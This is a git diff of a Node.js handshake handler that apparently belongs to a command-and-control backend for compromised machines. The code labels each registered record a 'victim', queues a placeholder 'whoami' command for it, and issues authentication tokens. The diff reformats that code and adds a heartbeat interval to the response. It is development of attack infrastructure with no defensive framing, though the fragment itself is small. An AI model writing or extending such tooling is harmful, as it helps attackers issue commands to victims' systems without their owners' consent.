@@ -32,12 +32,17 @@ async function initialHandshake(req, res) {
 					command: "whoami",
 					active: true,
 				});
-				
-				await firstPlaceholderCmd.save().then(() => {
-					console.info("saved placeholder cmd for victim: " + record._id)
-				}).catch((err) => {
-					console.error("failed to save placeholder cmd for victim: " + record._id);
-				})
+
+				await firstPlaceholderCmd
+					.save()
+					.then(() => {
+						console.info("saved placeholder cmd for victim: " + record._id);
+					})
+					.catch((err) => {
+						console.error(
+							"failed to save placeholder cmd for victim: " + record._id,
+						);
+					});
 
 				const RefreshToken = await authMiddleware.generateRefreshToken(
 					record._id,
@@ -47,7 +52,13 @@ async function initialHandshake(req, res) {
 
 				return res
 					.status(200)
-					.send({ status: true, JwtToken, RefreshToken, Username: record._id });
+					.send({
+						status: true,
+						JwtToken,
+						RefreshToken,
+						Username: record._id,
+						heartBeatInterval: record.heartBeatInterval,
+					});
 			})
 			.catch((err) => {
 				console.log(err);
